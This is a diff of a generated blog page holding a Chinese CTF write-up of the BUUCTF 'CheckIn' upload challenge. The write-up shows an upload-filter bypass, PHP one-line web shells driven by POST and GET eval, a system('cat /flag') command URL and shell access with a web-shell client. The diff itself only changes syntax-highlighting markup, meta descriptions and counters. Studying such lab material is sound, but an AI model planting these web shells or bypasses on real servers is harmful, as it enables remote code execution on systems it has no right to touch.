@@ -79,13 +79,13 @@
 
 
 
-<meta name="description" content="CheckIn打开环境看到是一个上传的界面 难道是一句话木马 上传一个一句话木马 抓包 之后更改Type 发现不行 把.php改为.png后 正常通过，看来是验证了后缀名 所以尝试在.php后加一个空格 再.png 成功上传 通过抓包 还发现过滤掉了&amp;lt;?, 所以我们变形为 1&amp;lt;script language=&amp;apos;php&amp;apos;&amp;gt;@eval($_POST[&amp;apos;a">
+<meta name="description" content="CheckIn打开环境看到是一个上传的界面 难道是一句话木马 上传一个一句话木马 抓包 之后更改Type 发现不行 把.php改为.png后 正常通过，看来是验证了后缀名 所以尝试在.php后加一个空格 再.png 成功上传 通过抓包 还发现过滤掉了&amp;lt;?, 所以我们变形为 1&amp;lt;script language=&amp;apos;php&amp;apos;&amp;gt;@eval($_POST[&amp;apos;a&amp;apos;]);&amp;lt;&#x2F;script">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUUCTF-CheckIn">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;25&#x2F;BUUCTF-CheckIn&#x2F;index.html">
 <meta property="og:site_name" content="diao-diao-UPUP">
-<meta property="og:description" content="CheckIn打开环境看到是一个上传的界面 难道是一句话木马 上传一个一句话木马 抓包 之后更改Type 发现不行 把.php改为.png后 正常通过，看来是验证了后缀名 所以尝试在.php后加一个空格 再.png 成功上传 通过抓包 还发现过滤掉了&amp;lt;?, 所以我们变形为 1&amp;lt;script language=&amp;apos;php&amp;apos;&amp;gt;@eval($_POST[&amp;apos;a">
+<meta property="og:description" content="CheckIn打开环境看到是一个上传的界面 难道是一句话木马 上传一个一句话木马 抓包 之后更改Type 发现不行 把.php改为.png后 正常通过，看来是验证了后缀名 所以尝试在.php后加一个空格 再.png 成功上传 通过抓包 还发现过滤掉了&amp;lt;?, 所以我们变形为 1&amp;lt;script language=&amp;apos;php&amp;apos;&amp;gt;@eval($_POST[&amp;apos;a&amp;apos;]);&amp;lt;&#x2F;script">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF&#x2F;CheckIn&#x2F;0.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF&#x2F;CheckIn&#x2F;1.png">
@@ -392,7 +392,7 @@
 <p>上传一个一句话木马 抓包 之后更改Type 发现不行 把.php改为.png后 正常通过，看来是验证了后缀名</p>
 <p>所以尝试在.php后加一个空格 再.png 成功上传</p>
 <p>通过抓包 还发现过滤掉了&lt;?, 所以我们变形为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&apos;php&apos;&gt;@eval($_POST[&apos;a&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'a'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>这里没有什么思路了 去看了一下WP  有两个知识点</p>
 <ol>
@@ -406,7 +406,7 @@
 <p>接下来用菜刀getshell</p>
 <p>得到flag</p>
 <p>这里还有一种GET型的一句话木马<br>步骤与之前差不多</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&apos;php&apos;&gt;@eval($_GET[&apos;a&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_GET[<span class="string">'a'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>URL：<br>?a=system(“cat /flag”);</p>
 <p>也可以得到flag</p>
 <p>题目提供了源码：<br><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p>
@@ -533,7 +533,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-count">37</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -544,7 +544,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
